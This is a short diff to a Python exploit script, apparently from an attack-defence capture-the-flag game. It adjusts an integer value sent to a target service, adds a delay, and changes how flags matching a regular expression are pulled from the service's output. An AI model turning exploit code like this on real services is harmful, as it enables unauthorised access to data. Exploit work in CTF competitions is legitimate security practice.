@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 from sploit_lib import *
 import re
+from time import sleep 
 
 flag_regexp = r"[A-Z0-9]{31}="
 
@@ -104,7 +105,7 @@ if __name__ == "__main__":
 		p.send( "-\n" )
 
 	p.recvuntil( ": " )
-	p.send( str( value & 0xffffffff ) + '\n' )
+	p.send( str( (value-1) & 0xffffffff ) + '\n' )
 	
 	p.recvuntil( ": " )
 	p.send( str( value // 0xffffffff ) + '\n' )
@@ -116,9 +117,12 @@ if __name__ == "__main__":
 		p.recvuntil( ": " )
 		p.send( "-\n" )
 
+	sleep( 2 )
+
 	#p.interactive()
-	buf = p.recvuntil( "voltage[0]" )
-	print re.findall( flag_regexp, buf)
+	buf = p.recvuntil( "voltage[" )
+	print re.findall( flag_regexp, buf )
+	#print buf
 
 	p.close()
 	
